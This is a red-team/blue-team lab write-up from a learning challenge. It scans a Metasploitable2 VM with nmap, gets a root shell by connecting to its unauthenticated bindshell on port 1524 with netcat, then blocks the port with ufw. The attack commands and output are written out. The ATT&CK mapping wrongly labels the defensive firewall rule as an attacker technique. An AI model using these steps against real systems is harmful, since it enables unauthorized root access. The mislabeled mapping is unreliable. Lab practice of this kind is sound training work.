# Day 12: Red Team vs Blue Team - Firewall Lockout

**Role**: Red Team + Blue Team 
**Target**: Metasploitable2 `192.168.56.3` 
**Date**: 2026-06-28 
**Challenge**: #100DayCybersecurityChallenge Day 12
**Repo**: https://github.com/[your-username]/30DayCybersecurityChallenge

---

### **1. Objective**
Attack a vulnerable Metasploitable2 VM via the `bindshell` backdoor on TCP/1524 to gain root. 
Then switch to Blue Team, block the port with UFW, and validate the defense by confirming self-lockout.

### **2. Lab Environment**
| Component | Detail |
| --- | --- |
| **Target VM** | Metasploitable2 `192.168.56.3` - NAT/Host-Only Network |
| **Attacker VM** | Kali Linux `192.168.56.4` |
| **Tools** | `ping`, `nmap`, `netcat nc`, `ufw` |
| **Vulnerable Service** | `1524/tcp bindshell Metasploitable root shell` |

### **3. Methodology & All Commands Used**

#### **Phase 1: Reconnaissance - Red Team**

# 1. Confirm host is up
ping -c 4 192.168.56.3

# 2. Full service/version scan 
sudo nmap -sV -sC -O -T4 192.168.56.3
*Key Output:*
21/tcp   open  ftp     vsftpd 2.3.4
1524/tcp open  bindshell  Metasploitable root shell
#### *Phase 2: Exploitation - Red Team*
# 3. Connect directly to the bindshell - no auth required
nc 192.168.56.3 1524
*Key Output:*
root@metasploitable:~#
*Result*: Root access gained in ∼3 seconds via T1190.

#### *Phase 3: Hardening - Blue Team*
# 4. Enable firewall
sudo ufw enable

# 5. Block the exploited backdoor port
sudo ufw deny 1524/tcp

# 6. Verify the rule
sudo ufw status verbose
*Key Output:*
1524/tcp  DENY       Anywhere
#### *Phase 4: Validation - Blue Team Test*
# 7. Retest the exploit from Kali
nc 192.168.56.3 1524
*Key Output:*
(UNKNOWN) [192.168.56.3] 1524 (ingresslock) : Connection timed out
*Result*: Attack blocked ✅, but remote access via that port is dead ❌

### *4. Evidence*
![Day 12 Recon](../screenshots/Day12-Attack-Recon.png) 
_Fig 1: Recon - `ping` host UP + `nmap` found vsftpd 2.3.4 + Anonymous FTP on :21_

![Day 12 Root Shell](../screenshots/Day12-Bindshell-Root.png) 
_Fig 2: Exploit - `nmap` confirmed `1524/tcp bindshell Metasploitable root shell`_

![Day 12 Lockout](../screenshots/Day12-Lockout-Proof.png) 
_Fig 3: Proof - Left: Kali `nc` times out. Right: Metasploitable `ufw status` shows `DENY`_

### *5. Key Takeaways & Lessons Learned*
1.  *Scan ➜ Exploit ➜ Harden ➜ Repeat*: This is the core cybersecurity loop.
2.  *Know Your Backdoors*: `1524/tcp bindshell` is a critical vuln in Metasploitable2. No auth = instant root.
3.  *Firewall Rules Work*: `T1562.004 - Impair Defenses: Firewall Rule` fully mitigated the attack vector.
4.  *Avoid Self-DoS*: Blocking your only access port without an alternate management path = lock yourself out. 
    *Fix*: Always `ufw allow ssh` or allow a management IP before `deny all`.

### *6. MITRE ATT&CK Mapping*
Tactic | Technique | Technique ID | Description
**Initial Access** | Exploit Public-Facing Application | T1190 | Exploited bindshell on 1524/tcp
**Defense Evasion** | Impair Defenses: Firewall Rule | T1562.004 | Used `ufw deny` to block the port
### *7. References*
1.  Metasploitable2 Exploit Database: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
2.  MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
3.  MITRE ATT&CK T1562.004: https://attack.mitre.org/techniques/T1562/004/

---
*Tags*: #RedTeam #BlueTeam #SOC #UFW #Firewall #Metasploitable2 #Linux #EthicalHacking #LearningInPublic #30DayCybersecurityChallenge

